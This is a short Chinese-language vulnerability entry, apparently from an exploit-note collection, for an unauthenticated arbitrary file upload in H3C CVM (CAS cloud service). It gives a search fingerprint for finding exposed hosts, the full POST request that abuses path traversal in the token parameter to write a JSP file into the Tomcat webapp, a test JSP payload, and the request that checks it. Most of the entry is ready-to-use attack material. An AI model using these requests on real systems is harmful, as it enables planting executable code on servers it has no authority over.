# H3CCVM前台任意文件上传漏洞

- **系统**：H3CCVM　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="H3C CAS 云服务"`
- **请求**：`POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/stc.jsp&name=222 HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Range: bytes 0-10/20`　`Content-Length: 23`

**请求体 / payload**
```
<%out.print("99999");%>

文件上传位置，请求需携带请求头Content-Range: bytes 0-10/20
GET /cas/js/lib/buttons/stc.jsp HTTP/1.1
Host: xx.xx.xx.xx
Content-Range: bytes 0-10/20
```

**其他**
- H3C CVM 前台任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
  * 三、资产测绘
  * 四、漏洞复现
***
- 版本: * H3C CVM